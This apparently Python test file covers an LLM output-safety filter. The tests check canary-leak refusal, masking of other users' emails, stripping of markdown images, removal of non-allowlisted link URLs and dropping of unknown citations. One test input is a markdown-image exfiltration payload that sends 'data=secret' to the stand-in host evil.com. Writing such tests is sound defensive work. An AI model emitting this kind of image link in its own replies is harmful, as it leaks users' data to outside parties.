from app.output_checks import run_output_checks


def test_canary_leak_is_refused():
    r = run_output_checks("the code is CANARY-SYS-abc123", ["CANARY-SYS-abc123"], set(), set())
    assert r.refused
    assert "LLM07" in r.events


def test_other_customer_email_is_masked():
    r = run_output_checks("contact jane.doe@example.com", [], set(), set())
    assert "[email hidden]" in r.text
    assert "LLM02" in r.events


def test_own_email_is_kept():
    r = run_output_checks("your email is me@example.com", [], set(), {"me@example.com"})
    assert "me@example.com" in r.text


def test_markdown_image_is_stripped():
    r = run_output_checks("![x](http://evil.com/a?data=secret)", [], set(), set())
    assert "image removed" in r.text
    assert "LLM05" in r.events


def test_non_allowlisted_link_text_kept_url_dropped():
    r = run_output_checks("see [here](http://evil.com/x)", [], set(), set())
    assert "evil.com" not in r.text
    assert "here" in r.text


def test_unknown_citation_removed():
    r = run_output_checks("fact [c1] other [c9]", [], {1}, set())
    assert "[c1]" in r.text
    assert "[c9]" not in r.text
